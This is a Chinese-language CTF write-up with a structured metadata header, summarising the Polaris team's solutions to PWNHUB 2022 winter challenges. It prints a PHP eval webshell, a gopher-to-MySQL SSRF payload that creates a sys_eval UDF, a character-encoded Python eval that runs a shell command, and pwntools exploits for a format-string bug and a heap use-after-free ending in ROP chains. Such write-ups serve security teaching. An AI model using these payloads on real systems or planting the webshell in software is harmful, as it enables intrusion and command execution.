---
title: PWNHUB 2022 冬季赛 Polaris 战队 WP (PHP eval + gopher MySQL + 字符串格式串 + heap UAF)
contest: PWNHUB
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [PHP eval webshell, gopher MySQL, sys_eval UDF, XXTEA btea 加密, 字符串格式串, heap UAF show]
attack_chain: |
  1. PHP webshell: <?php @eval($_POST['shell']); echo("hello");?>
  2. gopher MySQL udf: gopher://127.0.0.1:3306/_%a3...%a3 sys_eval('cat flag')
  3. Python 字符拼接: chr(95)+chr(95)+... = __import__('os').system('cat flag')
  4. Pyjail: whiteList + blackList 删 getattr/exec/open/__builtins__/__loader__/__spec__
  5. XXTEA btea 函数 (DELTA=0x9e3779b9) 加解密
  6. 字符串格式串: %379$#llx 泄栈 + libc → %hhn 多次写 one_gadget 0x4f302
  7. heap UAF: add(0, 0x80) + edit(16, 0x10) + show(16) 泄 image_addr → edit 改 chunk fd → show 泄 libc → 改 chunk → ROP one_gadget 0x1551f / pop_rdi 0x95941 / ret 0x43c7c
key_payload: |
  # 1. PHP eval webshell:
  <?php @eval($_POST['shell']); echo("hello");?>
  
  # 2. gopher MySQL UDF sys_eval:
  gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%39%00%00%00%03%43%52%45%41%54%45%20%46%55%4e%43%54%49%4f%4e%20%73%79%73%5f%65%76%61%6c%20%52%45%54%55%52%4e%53%20%53%54%52%49%4e%47%20%53%4f%4e%41%4d%45%20%27%75%64%66%2e%73%6f%27%3b%01%00%00%00%01
  
  # 3. Python 字符拼接 (绕引号):
  eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39))
  
  # 4. XXTEA btea 加解密:
  #define DELTA 0x9e3779b9
  #define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))
  void btea(uint32_t *v, int n, uint32_t const key[4]) { ... }
  
  # 5. 字符串格式串 + one_gadget:
  sh.sendlineafter(b'string format vuln testing: ', b'%379$#llx#%391$#llx#')
  stack_addr = int(sh.recvuntil(b'#'), 16)
  libc_addr = int(sh.recvuntil(b'#'), 16) - 0x21c87
  sh.sendlineafter(b'string format vuln testing: ', f'%{(stack_addr - 0xe0) & 0xffff}c%379$hn'.encode())
  one_gadget = libc_addr + 0x4f302
  
  # 6. heap UAF:
  sh.add(0, 0x80, b'aa')
  sh.edit(16, 0x10, b'a' * 0x10)
  sh.show(16)
  image_addr = u64(sh.recvn(6) + b'\x00\x00') - 0x40c0
  sh.edit(0, 8, p64(image_addr+0x3fe0))
  sh.show(0x390)
  libc_addr = u64(sh.recvn(6) + b'\x00\x00') - 0x17620
  sh.edit(0, 8, p64(libc_addr+0x9ade0))
  sh.show(0x390)
  stack_addr = u64(sh.recvn(6) + b'\x00\x00')
  sh.edit(0, 8, p64(stack_addr-0x90))
  sh.edit(0x390, 0x100, flat([libc_addr + 0x1551f, libc_addr + 0x95941, libc_addr + 0x43c7c]))
one_liner: PWNHUB 2022 冬季赛 Polaris 战队 WP: PHP eval webshell + gopher MySQL UDF sys_eval + XXTEA btea + 字符串格式串 + heap UAF。
lesson: |
  - PHP @eval($_POST['shell']) 是经典 webshell
  - gopher:// MySQL UDF sys_eval 经典提权
  - XXTEA btea 函数 (DELTA=0x9e3779b9) 是固定模板
  - 字符串格式串 %hhn 多次写 one_gadget 是入门 Pwn 模板
  - heap UAF: edit 改 chunk fd → show 泄漏 → 改 ROP 链
  - 跨类型组合 (Web + Pwn + 隐写) 是 PWNHUB 特色
quality: high
---

# PWNHUB 2022 冬季赛 Polaris 战队 WP

> 来源: ctfiot.com (Polaris 战队)

## Web

### 1. PHP eval webshell
```php
<?php @eval($_POST['shell']); echo("hello");?>
```

### 2. gopher MySQL UDF
```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%39%00%00%00%03%43%52%45%41%54%45%20%46%55%4e%43%54%49%4f%4e%20%73%79%73%5f%65%76%61%6c%20%52%45%54%55%52%4e%53%20%53%54%52%49%4e%47%20%53%4f%4e%41%4d%45%20%27%75%64%66%2e%73%6f%27%3b%01%00%00%00%01
```

### 3. Python 字符拼接 (绕引号)
```python
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39))
```

## Pyjail

```python
whiteList = string.ascii_letters + string.digits + ",!?;`#+-/$@&|~^<>(){}"
blackList = vars(__builtins__).copy()
for key in ("getattr", "exec", "open", "__builtins__", "__build_class__", "__loader__", "__spec__"):
    blackList[key] = None
print(eval(line, blackList))
```

## XXTEA 加解密 (btea)

```c
#define DELTA 0x9e3779b9
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))
void btea(uint32_t *v, int n, uint32_t const key[4]) {
    // n > 1: 加密
    // n < -1: 解密
}
```

## Pwn 字符串格式串

```python
sh.sendlineafter(b'string format vuln testing: ', b'%379$#llx#%391$#llx#')
stack_addr = int(sh.recvuntil(b'#'), 16)
libc_addr = int(sh.recvuntil(b'#'), 16) - 0x21c87
sh.sendlineafter(b'string format vuln testing: ', f'%{(stack_addr - 0xe0) & 0xffff}c%379$hn'.encode())
one_gadget = libc_addr + 0x4f302
byte = (one_gadget >> 0) & 0xff
sh.sendlineafter(b'string format vuln testing: ', f'%{byte}c%419$hhn'.encode())
# 多次写高位
sh.sendlineafter(b'string format vuln testing: ', b'Exit')
sh.interactive()
```

## Pwn heap UAF

```python
sh.add(0, 0x80, b'aa')
sh.edit(16, 0x10, b'a' * 0x10)
sh.show(16)
image_addr = u64(sh.recvn(6) + b'\x00\x00') - 0x40c0
sh.edit(0, 8, p64(image_addr+0x3fe0))
sh.show(0x390)
libc_addr = u64(sh.recvn(6) + b'\x00\x00') - 0x17620
sh.edit(0, 8, p64(libc_addr+0x9ade0))
sh.show(0x390)
stack_addr = u64(sh.recvn(6) + b'\x00\x00')
sh.edit(0, 8, p64(stack_addr-0x90))
sh.edit(0x390, 0x100, flat([libc_addr + 0x1551f, libc_addr + 0x95941, libc_addr + 0x43c7c]))
sh.interactive()
```

## 评价

PWNHUB 2022 冬季赛 Polaris 战队综合 WP：
- **PHP eval webshell** + gopher MySQL UDF sys_eval
- **XXTEA btea** 标准实现 (DELTA=0x9e3779b9)
- **字符串格式串** 多次 %hhn 写 one_gadget
- **heap UAF** edit → show → 改 ROP

适用读者：CTF 全栈 / Web + Pwn 综合
